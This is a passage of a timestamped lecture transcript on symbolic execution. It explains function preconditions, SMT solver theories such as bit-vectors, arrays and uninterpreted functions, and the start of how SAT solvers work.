              <text_slice>Yes?</text_slice>
            </slice>
            <slice>
              <time_slice>19:06</time_slice>
              <text_slice>AUDIENCE: What if a
[INAUDIBLE] are not</text_slice>
            </slice>
            <slice>
              <time_slice>19:07</time_slice>
              <text_slice>supposed to take an input?</text_slice>
            </slice>
            <slice>
              <time_slice>19:09</time_slice>
              <text_slice>[INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>19:15</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: Oh.</text_slice>
            </slice>
            <slice>
              <time_slice>19:16</time_slice>
              <text_slice>That's a very good question.</text_slice>
            </slice>
            <slice>
              <time_slice>19:17</time_slice>
              <text_slice>Right, so, for
example, let's say</text_slice>
            </slice>
            <slice>
              <time_slice>19:26</time_slice>
              <text_slice>we have the program that
we have here, but instead</text_slice>
            </slice>
            <slice>
              <time_slice>19:36</time_slice>
              <text_slice>of these being t equals x, here
we will say t equals x minus 1.</text_slice>
            </slice>
            <slice>
              <time_slice>19:46</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>19:47</time_slice>
              <text_slice>So now all of a
sudden, intuitively you</text_slice>
            </slice>
            <slice>
              <time_slice>19:48</time_slice>
              <text_slice>can see that now this
program could blow up, right?</text_slice>
            </slice>
            <slice>
              <time_slice>19:52</time_slice>
              <text_slice>Because when the program
takes this path then</text_slice>
            </slice>
            <slice>
              <time_slice>20:00</time_slice>
              <text_slice>t will indeed be less than x.</text_slice>
            </slice>
            <slice>
              <time_slice>20:02</time_slice>
              <text_slice>And you will indeed fail here.</text_slice>
            </slice>
            <slice>
              <time_slice>20:06</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>20:06</time_slice>
              <text_slice>So what will happen to
a program like this?</text_slice>
            </slice>
            <slice>
              <time_slice>20:10</time_slice>
              <text_slice>How will our symbolic
state look like?</text_slice>
            </slice>
            <slice>
              <time_slice>20:15</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>20:15</time_slice>
              <text_slice>So in this case, so t0,
when x is greater than y,</text_slice>
            </slice>
            <slice>
              <time_slice>20:22</time_slice>
              <text_slice>what is t0 now going
to be equal to?</text_slice>
            </slice>
            <slice>
              <time_slice>20:24</time_slice>
              <text_slice>It's not going to be equal to x.</text_slice>
            </slice>
            <slice>
              <time_slice>20:26</time_slice>
              <text_slice>It's going to be equal
to x minus 1, right?</text_slice>
            </slice>
            <slice>
              <time_slice>20:35</time_slice>
              <text_slice>And so that means that,
so, this condition now</text_slice>
            </slice>
            <slice>
              <time_slice>20:47</time_slice>
              <text_slice>has a satisfying assignment.</text_slice>
            </slice>
            <slice>
              <time_slice>20:50</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>20:50</time_slice>
              <text_slice>Now this can fail, but what
if you go to the developer</text_slice>
            </slice>
            <slice>
              <time_slice>20:56</time_slice>
              <text_slice>and say, hey, this
function can blow up</text_slice>
            </slice>
            <slice>
              <time_slice>21:03</time_slice>
              <text_slice>whenever x is greater than y.</text_slice>
            </slice>
            <slice>
              <time_slice>21:06</time_slice>
              <text_slice>And the developer
looks at this and says,</text_slice>
            </slice>
            <slice>
              <time_slice>21:11</time_slice>
              <text_slice>oh, I forgot to tell you.</text_slice>
            </slice>
            <slice>
              <time_slice>21:13</time_slice>
              <text_slice>Actually, this
function can never</text_slice>
            </slice>
            <slice>
              <time_slice>21:16</time_slice>
              <text_slice>be called with parameters
where x is greater than y.</text_slice>
            </slice>
            <slice>
              <time_slice>21:23</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>21:23</time_slice>
              <text_slice>That the client that calls
this function is just</text_slice>
            </slice>
            <slice>
              <time_slice>21:27</time_slice>
              <text_slice>a quick function that
I wrote for something.</text_slice>
            </slice>
            <slice>
              <time_slice>21:29</time_slice>
              <text_slice>And it has this branch for
some historical purpose.</text_slice>
            </slice>
            <slice>
              <time_slice>21:32</time_slice>
              <text_slice>But actually this
function will never</text_slice>
            </slice>
            <slice>
              <time_slice>21:34</time_slice>
              <text_slice>get called with
x greater than y.</text_slice>
            </slice>
            <slice>
              <time_slice>21:37</time_slice>
              <text_slice>You're like, well,
now you tell me.</text_slice>
            </slice>
            <slice>
              <time_slice>21:39</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>21:39</time_slice>
              <text_slice>But the way we can
think about this</text_slice>
            </slice>
            <slice>
              <time_slice>21:43</time_slice>
              <text_slice>is that there is an assumption
that x is going to be less than</text_slice>
            </slice>
            <slice>
              <time_slice>21:55</time_slice>
              <text_slice>or equal to y, right?</text_slice>
            </slice>
            <slice>
              <time_slice>21:57</time_slice>
              <text_slice>This is sometimes referred to
as a precondition or a contract</text_slice>
            </slice>
            <slice>
              <time_slice>22:02</time_slice>
              <text_slice>for this function.</text_slice>
            </slice>
            <slice>
              <time_slice>22:02</time_slice>
              <text_slice>The function is promising
to do something,</text_slice>
            </slice>
            <slice>
              <time_slice>22:04</time_slice>
              <text_slice>but only if you satisfy
this assumption.</text_slice>
            </slice>
            <slice>
              <time_slice>22:06</time_slice>
              <text_slice>And if you don't satisfy the
assumption, the function says,</text_slice>
            </slice>
            <slice>
              <time_slice>22:09</time_slice>
              <text_slice>I don't care what happens.</text_slice>
            </slice>
            <slice>
              <time_slice>22:11</time_slice>
              <text_slice>I only promise
that I'm not going</text_slice>
            </slice>
            <slice>
              <time_slice>22:12</time_slice>
              <text_slice>to fail when this
assumption is satisfied.</text_slice>
            </slice>
            <slice>
              <time_slice>22:15</time_slice>
              <text_slice>And it's the
responsibility of the color</text_slice>
            </slice>
            <slice>
              <time_slice>22:17</time_slice>
              <text_slice>to make sure that this condition
is never violated, right?</text_slice>
            </slice>
            <slice>
              <time_slice>22:20</time_slice>
              <text_slice>So how would we
encode that constraint</text_slice>
            </slice>
            <slice>
              <time_slice>22:26</time_slice>
              <text_slice>when we're solving
for equations?</text_slice>
            </slice>
            <slice>
              <time_slice>22:28</time_slice>
              <text_slice>Well, essentially
what we have is</text_slice>
            </slice>
            <slice>
              <time_slice>22:30</time_slice>
              <text_slice>we have this set
of constraints that</text_slice>
            </slice>
            <slice>
              <time_slice>22:31</time_slice>
              <text_slice>tell us whether this
branch is feasible.</text_slice>
            </slice>
            <slice>
              <time_slice>22:34</time_slice>
              <text_slice>And on top of the constraints
that we already have</text_slice>
            </slice>
            <slice>
              <time_slice>22:37</time_slice>
              <text_slice>we need to also make sure
that the precondition,</text_slice>
            </slice>
            <slice>
              <time_slice>22:45</time_slice>
              <text_slice>or the assumptions
are satisfied.</text_slice>
            </slice>
            <slice>
              <time_slice>22:48</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>22:48</time_slice>
              <text_slice>And now we want to
ask, OK, so can I</text_slice>
            </slice>
            <slice>
              <time_slice>22:53</time_slice>
              <text_slice>find an x and a y that satisfy
all of these constraints</text_slice>
            </slice>
            <slice>
              <time_slice>22:56</time_slice>
              <text_slice>together with these constraint
that I have on the input,</text_slice>
            </slice>
            <slice>
              <time_slice>22:59</time_slice>
              <text_slice>with these properties
that I know</text_slice>
            </slice>
            <slice>
              <time_slice>23:01</time_slice>
              <text_slice>that the input must satisfy?</text_slice>
            </slice>
            <slice>
              <time_slice>23:03</time_slice>
              <text_slice>And once again you can
see that this constraint</text_slice>
            </slice>
            <slice>
              <time_slice>23:06</time_slice>
              <text_slice>of x less than or equal
to y is the difference</text_slice>
            </slice>
            <slice>
              <time_slice>23:10</time_slice>
              <text_slice>between this constraint
being satisfiable,</text_slice>
            </slice>
            <slice>
              <time_slice>23:13</time_slice>
              <text_slice>and this constraint once
again becoming unsatisfiable.</text_slice>
            </slice>
            <slice>
              <time_slice>23:18</time_slice>
              <text_slice>That's a very important issue
when dealing with analysis,</text_slice>
            </slice>
            <slice>
              <time_slice>23:22</time_slice>
              <text_slice>especially when you want
to do this marginally</text_slice>
            </slice>
            <slice>
              <time_slice>23:25</time_slice>
              <text_slice>at the level of individual
functions at a time.</text_slice>
            </slice>
            <slice>
              <time_slice>23:27</time_slice>
              <text_slice>It makes sense to know
what the assumptions are</text_slice>
            </slice>
            <slice>
              <time_slice>23:32</time_slice>
              <text_slice>that the programmer
had in mind when</text_slice>
            </slice>
            <slice>
              <time_slice>23:34</time_slice>
              <text_slice>writing this function,
because if you don't know what</text_slice>
            </slice>
            <slice>
              <time_slice>23:36</time_slice>
              <text_slice>those assumptions were
you could say, yeah, here</text_slice>
            </slice>
            <slice>
              <time_slice>23:39</time_slice>
              <text_slice>are some inputs where it's going
to fail only for the programmer</text_slice>
            </slice>
            <slice>
              <time_slice>23:42</time_slice>
              <text_slice>to dismiss myth that by saying,
oh, but those inputs are not</text_slice>
            </slice>
            <slice>
              <time_slice>23:45</time_slice>
              <text_slice>possible, or those
inputs can never happen.</text_slice>
            </slice>
            <slice>
              <time_slice>23:49</time_slice>
              <text_slice>Other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>23:57</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>23:58</time_slice>
              <text_slice>So how do we do this in
a more mechanical way?</text_slice>
            </slice>
            <slice>
              <time_slice>24:03</time_slice>
              <text_slice>So there are two
aspects to this problem.</text_slice>
            </slice>
            <slice>
              <time_slice>24:07</time_slice>
              <text_slice>Aspect number one is
how do you actually</text_slice>
            </slice>
            <slice>
              <time_slice>24:11</time_slice>
              <text_slice>come up with these formulas?</text_slice>
            </slice>
            <slice>
              <time_slice>24:13</time_slice>
              <text_slice>So in this case it
was kind of intuitive</text_slice>
            </slice>
            <slice>
              <time_slice>24:15</time_slice>
              <text_slice>how we came up
with the formulas.</text_slice>
            </slice>
            <slice>
              <time_slice>24:17</time_slice>
              <text_slice>where we were just working
through it by hand,</text_slice>
            </slice>
            <slice>
              <time_slice>24:19</time_slice>
              <text_slice>but how do you come
up with these formulas</text_slice>
            </slice>
            <slice>
              <time_slice>24:21</time_slice>
              <text_slice>in a mechanical way?</text_slice>
            </slice>
            <slice>
              <time_slice>24:23</time_slice>
              <text_slice>And aspect number two is
once you have the formulas,</text_slice>
            </slice>
            <slice>
              <time_slice>24:27</time_slice>
              <text_slice>how do you actually solve them?</text_slice>
            </slice>
            <slice>
              <time_slice>24:30</time_slice>
              <text_slice>How can you actually
solve these formulas</text_slice>
            </slice>
            <slice>
              <time_slice>24:34</time_slice>
              <text_slice>that describe whether
your program fails or not?</text_slice>
            </slice>
            <slice>
              <time_slice>24:38</time_slice>
              <text_slice>And I'm actually going to start
with that second question.</text_slice>
            </slice>
            <slice>
              <time_slice>24:43</time_slice>
              <text_slice>Given that we're able to reduce
our problem to these formulas</text_slice>
            </slice>
            <slice>
              <time_slice>24:48</time_slice>
              <text_slice>that involve integer
reasoning that involved</text_slice>
            </slice>
            <slice>
              <time_slice>24:54</time_slice>
              <text_slice>in the case of
programs generally</text_slice>
            </slice>
            <slice>
              <time_slice>24:55</time_slice>
              <text_slice>you care about bit
vector reasoning.</text_slice>
            </slice>
            <slice>
              <time_slice>24:57</time_slice>
              <text_slice>[INAUDIBLE] programs, a lot of
times, you care about arrays.</text_slice>
            </slice>
            <slice>
              <time_slice>25:00</time_slice>
              <text_slice>You care about functions.</text_slice>
            </slice>
            <slice>
              <time_slice>25:01</time_slice>
              <text_slice>And you end up with
these giant formulas.</text_slice>
            </slice>
            <slice>
              <time_slice>25:04</time_slice>
              <text_slice>How in the world do you actually
solve them in a mechanical way?</text_slice>
            </slice>
            <slice>
              <time_slice>25:08</time_slice>
              <text_slice>And a lot of the technology
that we're talking about today,</text_slice>
            </slice>
            <slice>
              <time_slice>25:12</time_slice>
              <text_slice>and the reason why we're
actually talking about it</text_slice>
            </slice>
            <slice>
              <time_slice>25:14</time_slice>
              <text_slice>as a practical tool, have to
do with tremendous advances</text_slice>
            </slice>
            <slice>
              <time_slice>25:20</time_slice>
              <text_slice>in solvers for
logical questions.</text_slice>
            </slice>
            <slice>
              <time_slice>25:23</time_slice>
              <text_slice>And in particular, there
is a very important class</text_slice>
            </slice>
            <slice>
              <time_slice>25:25</time_slice>
              <text_slice>of solvers called satisfiability
modulo theory solvers,</text_slice>
            </slice>
            <slice>
              <time_slice>25:31</time_slice>
              <text_slice>often abbreviated as SMT.</text_slice>
            </slice>
            <slice>
              <time_slice>25:33</time_slice>
              <text_slice>But a lot of people
in the community</text_slice>
            </slice>
            <slice>
              <time_slice>25:35</time_slice>
              <text_slice>would argue that the name is
not a particularly good name,</text_slice>
            </slice>
            <slice>
              <time_slice>25:39</time_slice>
              <text_slice>but it's the one that everybody
uses and it has stuck.</text_slice>
            </slice>
            <slice>
              <time_slice>25:41</time_slice>
              <text_slice>What you need to know
about these SMT solvers</text_slice>
            </slice>
            <slice>
              <time_slice>25:45</time_slice>
              <text_slice>is that an SMT solver is
an algorithm essentially</text_slice>
            </slice>
            <slice>
              <time_slice>25:50</time_slice>
              <text_slice>that given a logical
formula will give you</text_slice>
            </slice>
            <slice>
              <time_slice>25:54</time_slice>
              <text_slice>one of two things.</text_slice>
            </slice>
            <slice>
              <time_slice>25:56</time_slice>
              <text_slice>it will give you either
a satisfying assignment</text_slice>
            </slice>
            <slice>
              <time_slice>25:58</time_slice>
              <text_slice>to the formula, or
it will tell you</text_slice>
            </slice>
            <slice>
              <time_slice>26:01</time_slice>
              <text_slice>that the formula
is unsatisfiable.</text_slice>
            </slice>
            <slice>
              <time_slice>26:04</time_slice>
              <text_slice>And that there is no
possible assignment</text_slice>
            </slice>
            <slice>
              <time_slice>26:09</time_slice>
              <text_slice>to the variables in
that formula that</text_slice>
            </slice>
            <slice>
              <time_slice>26:11</time_slice>
              <text_slice>will satisfy these
constraints that you defined.</text_slice>
            </slice>
            <slice>
              <time_slice>26:14</time_slice>
              <text_slice>Now in practice, if this
sounds a little bit scary</text_slice>
            </slice>
            <slice>
              <time_slice>26:18</time_slice>
              <text_slice>and a little bit like magic,
it is a little bit scary.</text_slice>
            </slice>
            <slice>
              <time_slice>26:21</time_slice>
              <text_slice>A lot of the problems that
these SMT solvers have to solve</text_slice>
            </slice>
            <slice>
              <time_slice>26:25</time_slice>
              <text_slice>are NP-complete
in the best case.</text_slice>
            </slice>
            <slice>
              <time_slice>26:28</time_slice>
              <text_slice>All right? the nice
ones are NP-complete.</text_slice>
            </slice>
            <slice>
              <time_slice>26:30</time_slice>
              <text_slice>The hard ones can get
much harrier than that.</text_slice>
            </slice>
            <slice>
              <time_slice>26:34</time_slice>
              <text_slice>So how can we have a system that
relies as its primary building</text_slice>
            </slice>
            <slice>
              <time_slice>26:41</time_slice>
              <text_slice>block on solving NP complete
PSPACE-complete problems?</text_slice>
            </slice>
            <slice>
              <time_slice>26:46</time_slice>
              <text_slice>And still have something
that works in practice?</text_slice>
            </slice>
            <slice>
              <time_slice>26:51</time_slice>
              <text_slice>And part of the answer is that
for a lot of these solvers</text_slice>
            </slice>
            <slice>
              <time_slice>26:54</time_slice>
              <text_slice>there is a third thing
that they can tell you,</text_slice>
            </slice>
            <slice>
              <time_slice>26:59</time_slice>
              <text_slice>which is, I don't know.</text_slice>
            </slice>
            <slice>
              <time_slice>27:09</time_slice>
              <text_slice>And so part of the
beauty of these solvers</text_slice>
            </slice>
            <slice>
              <time_slice>27:14</time_slice>
              <text_slice>is that for practical
problems, even</text_slice>
            </slice>
            <slice>
              <time_slice>27:16</time_slice>
              <text_slice>for very, very large and
complicated practical problems,</text_slice>
            </slice>
            <slice>
              <time_slice>27:19</time_slice>
              <text_slice>they are still able to do
better than simply telling you,</text_slice>
            </slice>
            <slice>
              <time_slice>27:22</time_slice>
              <text_slice>I don't know.</text_slice>
            </slice>
            <slice>
              <time_slice>27:23</time_slice>
              <text_slice>They are still able
to give you either</text_slice>
            </slice>
            <slice>
              <time_slice>27:26</time_slice>
              <text_slice>a guarantee that this
set of constraints</text_slice>
            </slice>
            <slice>
              <time_slice>27:30</time_slice>
              <text_slice>is unsatisfiable or an actual
satisfying assignment that</text_slice>
            </slice>
            <slice>
              <time_slice>27:34</time_slice>
              <text_slice>tells you exactly
what the answer is.</text_slice>
            </slice>
            <slice>
              <time_slice>27:40</time_slice>
              <text_slice>Yes?</text_slice>
            </slice>
            <slice>
              <time_slice>27:41</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]
For example, [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>27:48</time_slice>
              <text_slice>specification I don't
think you said anything</text_slice>
            </slice>
            <slice>
              <time_slice>27:50</time_slice>
              <text_slice>about how many bits are used to
store an integer. [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>28:00</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA:
That's a very good question.</text_slice>
            </slice>
            <slice>
              <time_slice>28:02</time_slice>
              <text_slice>And that really has
to do with how you</text_slice>
            </slice>
            <slice>
              <time_slice>28:05</time_slice>
              <text_slice>define your constraints, right?</text_slice>
            </slice>
            <slice>
              <time_slice>28:07</time_slice>
              <text_slice>So If you look at our simple
example from the beginning,</text_slice>
            </slice>
            <slice>
              <time_slice>28:18</time_slice>
              <text_slice>in this case, we assume that
these were the integers as</text_slice>
            </slice>
            <slice>
              <time_slice>28:25</time_slice>
              <text_slice>learned in elementary school.</text_slice>
            </slice>
            <slice>
              <time_slice>28:26</time_slice>
              <text_slice>And that we completely decided
to ignore overflow errors.</text_slice>
            </slice>
            <slice>
              <time_slice>28:34</time_slice>
              <text_slice>If you care about
overflow errors,</text_slice>
            </slice>
            <slice>
              <time_slice>28:35</time_slice>
              <text_slice>if overflow errors are actually
essential to the kind of bugs</text_slice>
            </slice>
            <slice>
              <time_slice>28:39</time_slice>
              <text_slice>you're trying to find, this
would not be a good way</text_slice>
            </slice>
            <slice>
              <time_slice>28:42</time_slice>
              <text_slice>to set up the problem.</text_slice>
            </slice>
            <slice>
              <time_slice>28:43</time_slice>
              <text_slice>What you need is to represent
these not so fast integers,</text_slice>
            </slice>
            <slice>
              <time_slice>28:49</time_slice>
              <text_slice>but as bit-vectors.</text_slice>
            </slice>
            <slice>
              <time_slice>28:50</time_slice>
              <text_slice>And the moment you represent
them as bit vectors</text_slice>
            </slice>
            <slice>
              <time_slice>28:52</time_slice>
              <text_slice>you have to have a
bit width in mind.</text_slice>
            </slice>
            <slice>
              <time_slice>28:55</time_slice>
              <text_slice>And this goes back to
what this modular theory</text_slice>
            </slice>
            <slice>
              <time_slice>29:01</time_slice>
              <text_slice>aspect in the solver means.</text_slice>
            </slice>
            <slice>
              <time_slice>29:03</time_slice>
              <text_slice>What this modular
theory aspect means</text_slice>
            </slice>
            <slice>
              <time_slice>29:05</time_slice>
              <text_slice>is that the solver is
actually extensible</text_slice>
            </slice>
            <slice>
              <time_slice>29:08</time_slice>
              <text_slice>with different theories.</text_slice>
            </slice>
            <slice>
              <time_slice>29:10</time_slice>
              <text_slice>The most popular theories are
the theory of bit-vector which</text_slice>
            </slice>
            <slice>
              <time_slice>29:15</time_slice>
              <text_slice>are fixed length bit-vectors.</text_slice>
            </slice>
            <slice>
              <time_slice>29:21</time_slice>
              <text_slice>That means that if you're
interpreting your formulas</text_slice>
            </slice>
            <slice>
              <time_slice>29:24</time_slice>
              <text_slice>in this theory of fixed
length bit-vectors</text_slice>
            </slice>
            <slice>
              <time_slice>29:26</time_slice>
              <text_slice>you have to fix the
length of the bit-vectors.</text_slice>
            </slice>
            <slice>
              <time_slice>29:28</time_slice>
              <text_slice>And you have to
explicitly specify</text_slice>
            </slice>
            <slice>
              <time_slice>29:31</time_slice>
              <text_slice>that these are going to be
32-bit bit-vectors, or 8 bit</text_slice>
            </slice>
            <slice>
              <time_slice>29:36</time_slice>
              <text_slice>bit-vectors, or
64-bit bit-vectors.</text_slice>
            </slice>
            <slice>
              <time_slice>29:39</time_slice>
              <text_slice>AUDIENCE: So if you wanted
to make the the bit symbolic</text_slice>
            </slice>
            <slice>
              <time_slice>29:42</time_slice>
              <text_slice>[INAUDIBLE], like this
is an x bit, is that--</text_slice>
            </slice>
            <slice>
              <time_slice>29:46</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: So
there's another theory which</text_slice>
            </slice>
            <slice>
              <time_slice>29:49</time_slice>
              <text_slice>is called the theory of arrays.</text_slice>
            </slice>
            <slice>
              <time_slice>29:53</time_slice>
              <text_slice>And we'll talk a little
bit more about it,</text_slice>
            </slice>
            <slice>
              <time_slice>29:55</time_slice>
              <text_slice>where unlike the
bit vector theory,</text_slice>
            </slice>
            <slice>
              <time_slice>29:59</time_slice>
              <text_slice>which is designed to be
for fixed length things</text_slice>
            </slice>
            <slice>
              <time_slice>30:02</time_slice>
              <text_slice>the theory of arrays is meant
to be for collections where</text_slice>
            </slice>
            <slice>
              <time_slice>30:07</time_slice>
              <text_slice>you don't actually
know the size a priori.</text_slice>
            </slice>
            <slice>
              <time_slice>30:10</time_slice>
              <text_slice>Now in practice
nobody uses the theory</text_slice>
            </slice>
            <slice>
              <time_slice>30:13</time_slice>
              <text_slice>of arrays to model
integers, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>30:16</time_slice>
              <text_slice>because it's too expensive.</text_slice>
            </slice>
            <slice>
              <time_slice>30:18</time_slice>
              <text_slice>It becomes way more
expensive to reason about</text_slice>
            </slice>
            <slice>
              <time_slice>30:21</time_slice>
              <text_slice>when you don't know
what the bound is.</text_slice>
            </slice>
            <slice>
              <time_slice>30:23</time_slice>
              <text_slice>So generally people
use fixed length theory</text_slice>
            </slice>
            <slice>
              <time_slice>30:25</time_slice>
              <text_slice>of bit-vectors when reasoning
about integers or characters</text_slice>
            </slice>
            <slice>
              <time_slice>30:30</time_slice>
              <text_slice>even.</text_slice>
            </slice>
            <slice>
              <time_slice>30:33</time_slice>
              <text_slice>Another very common theory is
the theory of actual integer</text_slice>
            </slice>
            <slice>
              <time_slice>30:41</time_slice>
              <text_slice>arithmetic, and in particularly
linear integer arithmetic.</text_slice>
            </slice>
            <slice>
              <time_slice>30:44</time_slice>
              <text_slice>This is a theory that
people like a lot because it</text_slice>
            </slice>
            <slice>
              <time_slice>30:47</time_slice>
              <text_slice>can be reasoned about
very, very efficiently,</text_slice>
            </slice>
            <slice>
              <time_slice>30:50</time_slice>
              <text_slice>but it's not
particularly good when</text_slice>
            </slice>
            <slice>
              <time_slice>30:52</time_slice>
              <text_slice>you're reasoning about programs,
because in general you really</text_slice>
            </slice>
            <slice>
              <time_slice>30:55</time_slice>
              <text_slice>do care about overflow issues.</text_slice>
            </slice>
            <slice>
              <time_slice>30:59</time_slice>
              <text_slice>But it's actually very widely
used for many, many things.</text_slice>
            </slice>
            <slice>
              <time_slice>31:03</time_slice>
              <text_slice>The other theory that you're
likely to see people using</text_slice>
            </slice>
            <slice>
              <time_slice>31:07</time_slice>
              <text_slice>is the theory of
uninterpreted functions.</text_slice>
            </slice>
            <slice>
              <time_slice>31:19</time_slice>
              <text_slice>So what does it mean, the theory
of an uninterpreted function?</text_slice>
            </slice>
            <slice>
              <time_slice>31:22</time_slice>
              <text_slice>It means that you have a formula
where somewhere in your formula</text_slice>
            </slice>
            <slice>
              <time_slice>31:27</time_slice>
              <text_slice>you know that you're
calling a function,</text_slice>
            </slice>
            <slice>
              <time_slice>31:29</time_slice>
              <text_slice>but you know nothing
about that function</text_slice>
            </slice>
            <slice>
              <time_slice>31:31</time_slice>
              <text_slice>other than the fact that it is
a function, that if you give it</text_slice>
            </slice>
            <slice>
              <time_slice>31:39</time_slice>
              <text_slice>the same inputs you get
the same outputs in return.</text_slice>
            </slice>
            <slice>
              <time_slice>31:42</time_slice>
              <text_slice>And it turns out this is
very, very useful sometimes</text_slice>
            </slice>
            <slice>
              <time_slice>31:45</time_slice>
              <text_slice>when trying to
reason about things</text_slice>
            </slice>
            <slice>
              <time_slice>31:47</time_slice>
              <text_slice>like if you floating point
code, modeling, sine, cosines,</text_slice>
            </slice>
            <slice>
              <time_slice>31:53</time_slice>
              <text_slice>square roots can be very
messy and expensive,</text_slice>
            </slice>
            <slice>
              <time_slice>31:56</time_slice>
              <text_slice>but you can say,
look, I don't actually</text_slice>
            </slice>
            <slice>
              <time_slice>31:57</time_slice>
              <text_slice>care about what the
sine function does.</text_slice>
            </slice>
            <slice>
              <time_slice>32:01</time_slice>
              <text_slice>I don't care about
what its output is.</text_slice>
            </slice>
            <slice>
              <time_slice>32:03</time_slice>
              <text_slice>All I know is that if I
call the sine function</text_slice>
            </slice>
            <slice>
              <time_slice>32:05</time_slice>
              <text_slice>in many different
places with the input</text_slice>
            </slice>
            <slice>
              <time_slice>32:07</time_slice>
              <text_slice>I will get the same output.</text_slice>
            </slice>
            <slice>
              <time_slice>32:08</time_slice>
              <text_slice>And that's enough for me
to reason about my code.</text_slice>
            </slice>
            <slice>
              <time_slice>32:14</time_slice>
              <text_slice>And so the most
common ones you will</text_slice>
            </slice>
            <slice>
              <time_slice>32:17</time_slice>
              <text_slice>see when analyzing
real systems are</text_slice>
            </slice>
            <slice>
              <time_slice>32:21</time_slice>
              <text_slice>bit-vectors to deal
with integers, and logs,</text_slice>
            </slice>
            <slice>
              <time_slice>32:24</time_slice>
              <text_slice>and pointers.</text_slice>
            </slice>
            <slice>
              <time_slice>32:26</time_slice>
              <text_slice>Actually, pointers are often
represented with integer</text_slice>
            </slice>
            <slice>
              <time_slice>32:30</time_slice>
              <text_slice>because you're
generally not going</text_slice>
            </slice>
            <slice>
              <time_slice>32:35</time_slice>
              <text_slice>to be doing complicated
bit whittling on pointers.</text_slice>
            </slice>
            <slice>
              <time_slice>32:40</time_slice>
              <text_slice>Sometimes you will and then
you can't use integers anymore.</text_slice>
            </slice>
            <slice>
              <time_slice>32:44</time_slice>
              <text_slice>So OK.</text_slice>
            </slice>
            <slice>
              <time_slice>32:46</time_slice>
              <text_slice>So that's all well and good.</text_slice>
            </slice>
            <slice>
              <time_slice>32:48</time_slice>
              <text_slice>That's what an SMT
solver can do for you.</text_slice>
            </slice>
            <slice>
              <time_slice>32:52</time_slice>
              <text_slice>How does it actually work?</text_slice>
            </slice>
            <slice>
              <time_slice>32:54</time_slice>
              <text_slice>What's inside it
that makes it work?</text_slice>
            </slice>
            <slice>
              <time_slice>32:56</time_slice>
              <text_slice>And SMT solvers actually
rely on our ability</text_slice>
            </slice>
            <slice>
              <time_slice>33:01</time_slice>
              <text_slice>to solve SAT problems,
on our ability</text_slice>
            </slice>
            <slice>
              <time_slice>33:04</time_slice>
              <text_slice>to take problems involving
just purely Boolean constraints</text_slice>
            </slice>
            <slice>
              <time_slice>33:10</time_slice>
              <text_slice>and Boolean variables,
and telling us</text_slice>
            </slice>
            <slice>
              <time_slice>33:13</time_slice>
              <text_slice>whether there is an assignment
to these Boolean variables</text_slice>
            </slice>
            <slice>
              <time_slice>33:16</time_slice>
              <text_slice>that is satisfiable or not.</text_slice>
            </slice>
            <slice>
              <time_slice>33:20</time_slice>
              <text_slice>And this is the kind of thing
that for many, many years</text_slice>
            </slice>
            <slice>
              <time_slice>33:24</time_slice>
              <text_slice>people in undergrad have been
taught that actually this</text_slice>
            </slice>
            <slice>
              <time_slice>33:27</time_slice>
              <text_slice>is an NP-complete problem.</text_slice>
            </slice>
            <slice>
              <time_slice>33:28</time_slice>
              <text_slice>The moment something
reduces to SAT</text_slice>
            </slice>
            <slice>
              <time_slice>33:30</time_slice>
              <text_slice>you know you shouldn't
do it, but it turns out</text_slice>
            </slice>
            <slice>
              <time_slice>33:33</time_slice>
              <text_slice>that we actually have
some very, very good SAT</text_slice>
            </slice>
            <slice>
              <time_slice>33:35</time_slice>
              <text_slice>solvers out there.</text_slice>
            </slice>
            <slice>
              <time_slice>33:36</time_slice>
              <text_slice>Probably most of you even
built one as part of 6005.</text_slice>
            </slice>
            <slice>
              <time_slice>33:42</time_slice>
              <text_slice>Am I right?</text_slice>
            </slice>
            <slice>
              <time_slice>33:43</time_slice>
              <text_slice>Or some of you did.</text_slice>
            </slice>
            <slice>
              <time_slice>33:46</time_slice>
              <text_slice>So I'll tell you the basic idea
behind how SAT solvers work.</text_slice>
            </slice>
            <slice>
              <time_slice>33:50</time_slice>
              <text_slice>And the basic idea is that
you take all your constraints</text_slice>
            </slice>
            <slice>
              <time_slice>33:56</time_slice>
              <text_slice>on your Boolean variables and
you put them into a database.</text_slice>
            </slice>
            <slice>
              <time_slice>34:00</time_slice>
              <text_slice>And what is a constraint?</text_slice>
            </slice>
            <slice>
              <time_slice>34:03</time_slice>
              <text_slice>Is this too small or can
people in the back read this?</text_slice>
            </slice>
            <slice>
              <time_slice>34:09</time_slice>
              <text_slice>AUDIENCE: Too small.</text_slice>
            </slice>
            <slice>
              <time_slice>34:10</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: Too small?</text_slice>
            </slice>
            <slice>
              <time_slice>34:11</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>34:15</time_slice>
              <text_slice>Let's see if we can
make this bigger.</text_slice>
            </slice>
            <slice>
              <time_slice>34:42</time_slice>
              <text_slice>Is this a little bit better?</text_slice>
            </slice>
            <slice>
              <time_slice>34:45</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>34:46</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: OK.</text_slice>
            </slice>
            <slice>
              <time_slice>34:47</time_slice>
              <text_slice>Well, here's what I'll do.</text_slice>
            </slice>
            <slice>
              <time_slice>34:51</time_slice>
              <text_slice>I will annotate and I
will narrate it as I go.</text_slice>
            </slice>
            <slice>
              <time_slice>34:54</time_slice>
              <text_slice>And I'll post the slides later.</text_slice>
            </slice>
